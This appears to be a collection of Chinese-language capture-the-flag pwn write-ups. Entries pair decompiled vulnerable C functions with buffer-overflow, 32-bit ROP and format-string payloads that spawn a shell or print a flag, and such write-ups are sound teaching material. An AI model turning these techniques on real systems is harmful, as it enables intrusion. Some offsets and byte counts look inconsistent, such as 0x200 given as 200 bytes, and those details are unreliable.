## warmup_csaw_2016

危险函数`gets`，缓冲区距离栈顶`0x40`字节

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  char v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", sub_40060D);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```

程序会打印出函数`sub_40060D`的地址，此函数调用了`system('/bin/sh')`

由于是64位程序，rbp大小为8，故`payload = 'a' * 0x48 + sub_addr`

## ciscn_2019_n_1

危险函数`gets`，利用它通过覆盖掉`v2`的值；`v1`与`v2`距离为`0x2c`，`11.28125`的二进制表示是`0x41348000`
故`payload = 'a' * 0x2c + p64(0x41348000)`

```c
int func()
{
  int result; // eax
  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    result = system("cat /flag");
  else
    result = puts("Its value should be 11.28125");
  return result;
}
```

## ciscn_2019_n_8

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  //...
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL )
      system("/bin/sh");
  }
  //...
}
```

只需要使得`int64_t(var[13:21])`的值为17即可；考虑字节序即`var[13]=17, var[14:21]=0`

`payload = p32(17)*14 + p32(0)*7`

## jarvisoj_level0

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}
```

buf距离rbp为0x80=128字节，read写入200字节，缓冲区溢出；rbp大小为8；callsystem函数地址为0x400596

```
payload = b'a'*136 + p64(0x400596)
```

## jarvisoj_level2

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u);
}
```

明显的缓冲区溢出，无直接调用`system("/bin/sh")`但有`system()`函数地址0x0804a020，String view看到`"/bin/sh"`的地址0x0804a024，构造32位rop

`payload = b'a'*(0x88+4) + p32(0x8048320) + b'c'*4 + p32(0x0804a024)`

## get_started_3dsctf_2016

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf("Qual a palavrinha magica? ", v4[0]);
  gets(v4);
  return 0;
}
```

`gets()`缓冲区溢出，通过String view看到`"flag.txt"`，Jump to xref to operand，发现了一个`get_flag(a1, a2)`函数（0x80489a0）输出文件的内容

```c
void __cdecl get_flag(int a1, int a2)
{
  //...
  if ( a1 == 0x308CD64F && a2 == 0x195719D1 )
  {
    // Print file flag.txt
    //...
  }
}
```

构造32位rop，`get_flag(814536271, 425138641)`即可

注意：1.本题中的函数调用开头没有`push ebp`（这是编译器偏好决定的，只要栈的信息能够保存就可以了），故不用覆盖；2.`get_flag()`函数输出时不会清空`stdout`的缓冲区，需要正常退出，即返回到`exit()`（0x804e6a0）才能看到输出

`payload = b'a'*0x38 + p32(0x80489a0) + p32(0x804e6a0) + p32(0x308CD64F) + p32(0x195719D1)`

## pwn1_sctf_2016

```c
  // vuln()
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  // ...
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
```

`IDA`可以看到`fgets`函数，危险的`strcpy`函数；但本题使用IDA会得到奇奇怪怪的代码，故使用gdb动态调试

```
stack 0xffffd214 —▸ 0x804b0ac (input) —▸ 0x80513dc ◂— 'IIIIII\n'
seg   0x8049257 <vuln+168>    call   replace                     <replace>
stack 0xffffd214 —▸ 0x804b0ac (input) —▸ 0x805151c ◂— 'youyouyouyouyouyou\n'
```

`replace`函数将输入字符串中的`"I"`替换为`"you"`，导致字符串变长进而可能在`strcpy`处溢出。

函数窗口中可见`get_flag`函数，地址为0x8048f0d

`s`距离`ebp`为0x3c字节，`ebp`为4字节，垃圾数据总量为 0x3c + 4 = 64字节，64 = 3*21+1

`payload = b'I'*21 + b'a' + p32(0x8048f0d)`

## [第五空间2019 决赛]PWN5

```c
int __cdecl main(int a1)
{
  //...
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  //...
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  // ...
}
```

[printf格式化字符串漏洞原理解析](https://blog.csdn.net/liucc09/article/details/110142208)

`nptr`和地址`dword_804C044`比较，通过`printf`漏洞改写0x804C044的值即可

```
your name:abcd%10$x
Hello,abcd64636261
```

使用`abcd%N$x`重复输入测试得偏移量N为10，直接用pwntools构造`fmtstr_payload(10,{0x0804C044: 0x12345678})`

```python
sh.sendline(fmtstr_payload(10,{0x0804C044: 0x12345678}))
sh.sendline(str(0x12345678).encode('ascii'))
```

## rip

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

危险函数`gets`，缓冲区距离栈顶`0xF`字节

通过Strings view找到`"/bin/sh"`，被`fun`函数引用；函数地址为`0x401186`

```c
int fun()
{
  return system("/bin/sh");
}
```

### 方法1

由于是64位程序，`rbp`大小为`8`，故`payload = b'a' * (0xf+8) + p64(0x401186)` 但攻击失败。搜索了下是栈对其问题

参考：[在一些64位的glibc的payload调用system函数失败问题](http://blog.eonew.cn/archives/958)

```python
payload = b'a' * (0xf) + p64(0x401187)
```

### 方法2

Edit ==> functions ==> Stack variable 查看栈视图，发现返回地址在`s+0xF`处

```x86asm
-000000000000000F s               db ?
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
```

```python
payload = b'a' * (0xf) + p64(0x401186)
```
